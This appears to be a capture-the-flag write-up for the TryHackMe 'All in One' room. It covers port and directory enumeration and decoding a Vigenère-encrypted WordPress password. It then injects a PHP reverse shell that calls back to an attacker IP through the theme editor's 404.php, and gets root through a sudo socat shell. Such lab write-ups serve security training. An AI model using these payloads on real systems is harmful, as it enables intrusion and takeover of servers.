# [All in One](https://tryhackme.com/room/allinonemj)

## This is a fun box where you will get to exploit the system in several ways. Few intended and unintended paths to getting user and root access.

# Hack the machine !

This box's intention is to help you practice **several** ways in exploiting a system. There is few **intended** paths to exploit it and few **unintended** paths to get root.

Try to discover and exploit them all. **Do not** just exploit it using intended paths, hack like a **pro** and **enjoy** the box !

### user.txt

1. Start with an initial port scan to discover open services on the target machine:

```bash
nmap -sV -p- <TARGET_IP>
```

**Results:**

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

2. Perform directory enumeration on the web server to discover hidden directories and files:

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```

**Results:**

```
/wordpress            (Status: 301) [Size: 318] [--> http://<TARGET_IP>/wordpress/]
/hackathons           (Status: 200) [Size: 197]
/server-status        (Status: 403) [Size: 278]
```

3. Enumerate the WordPress directory more thoroughly, looking for PHP files and text files:

```bash
gobuster dir -u http://<TARGET_IP>/wordpress -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php -t 50
```

**Results:**

```
/wp-content           (Status: 301) [Size: 329] [--> http://<TARGET_IP>/wordpress/wp-content/]
/wp-login.php         (Status: 200) [Size: 6790]
/index.php            (Status: 301) [Size: 0] [--> http://<TARGET_IP>/wordpress/]
/license.txt          (Status: 200) [Size: 19915]
/wp-includes          (Status: 301) [Size: 330] [--> http://<TARGET_IP>/wordpress/wp-includes/]
/wp-trackback.php     (Status: 200) [Size: 135]
/wp-admin             (Status: 301) [Size: 327] [--> http://<TARGET_IP>/wordpress/wp-admin/]
/xmlrpc.php           (Status: 405) [Size: 42]
/wp-signup.php        (Status: 302) [Size: 0] [--> http://<TARGET_IP>/wordpress/wp-login.php?action=register]
```

Standard WordPress structure discovered. The /wp-login.php page will be useful once we obtain credentials.

4. Navigate to `http://<TARGET_IP>/hackathons` and inspect the page. There is visible text stating `Damn how much I hate the smell of Vinegar :/ !!!`. View the page source and find HTML comments containing:
   - `Dvc W@iyur@123` (appears to be an encoded password)
   - `KeepGoing` (potential decryption key)

5. Decode the encrypted string using the Vigenère cipher in[CyberChef](https://gchq.github.io/CyberChef/).
   - Input: `Dvc W@iyur@123`
   - Key: `KeepGoing`
   - Output: `Try H@ckme@123`

6. Navigate to `http://<TARGET_IP>/wordpress/wp-login.php` and log in with the discovered credentials: `elyana:H@ckme@123` ...

7. Set up a netcat listener on your attacking machine to catch the reverse shell:

```bash
nc -lvnp 4444
```

8. Navigate to `http://<TARGET_IP>/wordpress/wp-admin/theme-editor.php?file=404.php&theme=twentytwenty` and inject the following PHP reverse shell payload into the 404.php template file:

```php
<?php
$ip = '<ATTACKER_IP>';
$port = 4444;

$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh -i', array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
?>
```

9. Trigger the reverse shell by visiting a non-existent author page: `http://<TARGET_IP>/wordpress/index.php/author/test/`

10. Once you have a shell, explore the system and read the hint file:

```bash
cat /home/elyana/hint.txt
```

**Results:**

```
Elyana's user password is hidden in the system. Find it ;)
```

11. Search for all files owned by the user elyana:

```bash
find / -user elyana -type f 2>/dev/null
```

**Results:**

```
/home/elyana/user.txt
/home/elyana/.bash_logout
/home/elyana/hint.txt
/home/elyana/.bash_history
/home/elyana/.profile
/home/elyana/.sudo_as_admin_successful
/home/elyana/.bashrc
/etc/mysql/conf.d/private.txt
```

12. Read the suspicious file to discover elyana's credentials:

```bash
cat /etc/mysql/conf.d/private.txt
```

**Results:**

```
user: elyana
password: E@syR18ght
```

13. Switch to the elyana user and retrieve the user flag:

```bash
su elyana
cat /home/elyana/user.txt
```

<img width="516" height="378" alt="SCREEN01" src="https://github.com/user-attachments/assets/7ddb715a-d735-4980-833d-f87524895cc7" />

---

### root.txt

1. Upgrade the shell to a fully interactive TTY for better command execution:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

2. Check what commands elyana can run with sudo privileges:

```bash
sudo -l
```

**Results:**

```
User elyana may run the following commands on ip-10-114-134-158:
    (ALL) NOPASSWD: /usr/bin/socat
```

3. Consult `https://gtfobins.org/gtfobins/socat/` for socat privilege escalation techniques. Use socat to spawn a root shell:

```bash
sudo /usr/bin/socat - exec:/bin/sh,pty,ctty,raw,echo=0
```

4. Verify root access and retrieve the root flag:

```bash
cat /root/root.txt
```

<img width="677" height="217" alt="SCREEN02" src="https://github.com/user-attachments/assets/f883e4c6-a620-41fe-825b-d0a96413aea8" />
